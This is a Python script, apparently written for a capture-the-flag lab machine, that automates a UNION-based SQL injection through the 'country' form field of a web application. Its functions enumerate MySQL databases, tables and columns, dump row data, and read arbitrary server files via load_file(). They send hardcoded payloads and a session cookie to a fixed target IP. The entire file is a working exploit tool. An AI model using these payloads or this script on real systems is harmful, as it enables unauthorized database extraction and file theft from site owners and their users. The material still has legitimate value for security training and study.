#!/usr/env/bin/python


#Purpose:
#Version:1.0
#Created Date: sáb 22 abr 2023 10:43:22 -05
#Modified Date:
#Website:
#Script name: sqliValidation
#Author: Jorge Donaires Mendoza

#LINEOFTEXT

from pwn import *
import requests
import argparse
import signal
import base64
import sys
import time
import re

# GLOBAL VARIABLES
URL = 'http://10.10.11.116'
USERNAME = 'jorge'
COOKIE = {'user':'d67326a22642a324aa1b0745f2f17abb'}

# CLASES
class Color:

  red = '\033[91m'
  green = '\033[92m'
  yellow = '\033[93m'
  ligth_purple = '\033[94m'
  purple = '\033[95m'
  cyan = '\033[96m'
  ligth_gray = '\033[97m'
  black = '\033[98m'
  end = '\033[00m'

def def_handler(sig, frame):
  print(f'\n\n{Color.red}[!] Interrupting...{Color.end}')
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def show_banner():

  with open('banner.txt', 'r', encoding='ascii') as file:
    file = file.read()
    banner = base64.b64decode(f'{file}').decode()
    autor = "CiBieSBKb3JnZTI1MTA5OQo="
    autor = base64.b64decode(autor).decode()
    print(f'\n\n{Color.green}{banner}\n{autor}{Color.end}\n\n')
    

def arguments():

  parse = argparse.ArgumentParser(description='Welcome to my first script')
  parse.add_argument('-f', '--file', dest='file_name', help='Archivo que desea lear del sistema')
  parse.add_argument('-q', '--query', dest='dump', nargs='*', help='Consulta MySQL: descubre db, tablas, columnas y sus datos.')
  return parse.parse_args()

def print_help():

  print(f'Uso :{sys.argv[0]} [-h] [-q [DUMP ...]]')
  print('\nEjemplos')
  print(f'{sys.argv[0]} --query -> (to extract databases)')
  print(f'{sys.argv[0]} --query db_name -> (to extract tables)')


def make_sqli(payload):

  r = requests.post(URL, data={'username': USERNAME, 'country':payload})

  if 'Uncaught Error: Call to a member' not in r.text:
    result = re.findall(r"<li class=\\'text-white\\'>(.*?)<",str(r.content))[0]
    if result == '':
      return '1'
    return result.replace('\\n', '\n').replace('\\t','\t')

  else:
    return '1'

def show_result(row, payload):

  result = make_sqli(payload)

  if result == '1':
    sys.exit(0)

  elif row == 0 and  result == '1' :
    print('No se pudo extraer las bases de datos')
    sys.exit(0)
  print('\t' + Color.red + '[*] ' + Color.end + Color.ligth_purple + result + Color.end)


def show_file(filename):

  print(f'{Color.ligth_gray}[*] Leyendo el archivo {filename}{Color.end}\n')
  print('\n')

  payload = f"Brazil ' union select load_file('{filename}') -- -'"
  r = requests.post(URL, data={'username': USERNAME, 'country':payload}, cookies=COOKIE)
  print(r.content)


def show_databases_limited():

  print(f'{Color.ligth_gray}[*] Dumpeando las bases de datos actuales del servicio MySQL.{Color.end}\n')
  print('\n')

  try:
    for row in range(101):

      payload = f"Brazil ' union select schema_name from information_schema.schemata limit {row},1 -- -'"

      show_result(row, payload)

  except IndexError:
    pass


def show_tables(db):

  print(f'{Color.ligth_gray}[*] Dumpeando las tablas de la base de datos de {db[0]} {Color.end}')
  print('\n')

  try:
    for row in range(101):

      payload = f"Brazil ' union select table_name from information_schema.tables where table_schema='{db[0]}' limit {row},1 -- -'"

      show_result(row, payload)
  except IndexError:
    pass


def show_columns(db_table):

  print(f'{Color.ligth_gray}[*] Dumpeando las columnas de la tabla {db_table[1]} de la base de datos de {db_table[0]} {Color.end}')
  print('\n')

  try:
    for row in range(101):

      payload = f"Brazil ' union select column_name from information_schema.columns where table_schema='{db_table[0]}' and table_name='{db_table[1]}' limit {row},1 -- -'"

      show_result(row ,payload)
  except IndexError:
    pass


def show_data(db_table_column):


  list_column = db_table_column[2].split(',')
  column_concat = ','.join(list_column)
  column_concat2 = ',0x3a,'.join(list_column)
  print(f'{Color.ligth_gray}[*] Dumpeando la data de las columnas {column_concat} de la de la tabla {db_table_column[0]}.{db_table_column[1]} {Color.end}')
  print('\n')

  try:
    for row in range(101):

      payload = f"Brazil ' union select concat({column_concat2}) from {db_table_column[0]}.{db_table_column[1]} limit {row},1 -- -'"

      show_result(row, payload)
  except IndexError:
    pass


def main():

  time.sleep(0.3)
  args = arguments()

  show_banner()


  try:
    if args.file_name:
      show_file(args.file_name)
    elif len(args.dump) == 0:
      show_databases_limited()
    elif len(args.dump) == 1:
      show_tables(args.dump)
    elif len(args.dump) == 2:
      show_columns(args.dump)
    elif len(args.dump) >= 3:
      show_data(args.dump)
    else:
      print_help()
  except TypeError:
    print('xd')


if __name__ == '__main__':

  try:
    main()

  except KeyboardInterrupt:
    print('Programa cancelado')

# END #
    
